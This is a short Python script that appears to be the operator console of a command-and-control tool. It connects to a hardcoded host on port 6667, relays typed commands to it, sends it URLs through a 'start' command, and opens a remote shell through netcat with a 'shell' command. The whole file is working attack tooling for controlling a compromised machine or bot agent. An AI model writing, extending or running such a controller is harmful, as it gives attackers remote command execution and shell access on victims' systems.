import socket, readline, os, subprocess

ip = '10.9.1.23'
port = 6667

def connection():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print('connected successfully!')

	while True:
		cmd = input('~# ')
		if cmd == 'gg':
			s.send('gg'.encode())
			print(s.recv(1024).decode())
		elif cmd == 'start':
			s.send(cmd.encode())
			ui = input('enter url: ')
			s.send(ui.encode())
		elif cmd == 'clear':
			os.system('clear')
		elif cmd == 'shell':
			s.send('shell'.encode())
			print(s.recv(1024).decode())
			os.system(f'nc {ip} 9999')
		elif cmd == 'exit':
			exit(0)
		else:
			s.send(cmd.encode())
			print(s.recv(1024).decode())


connection()
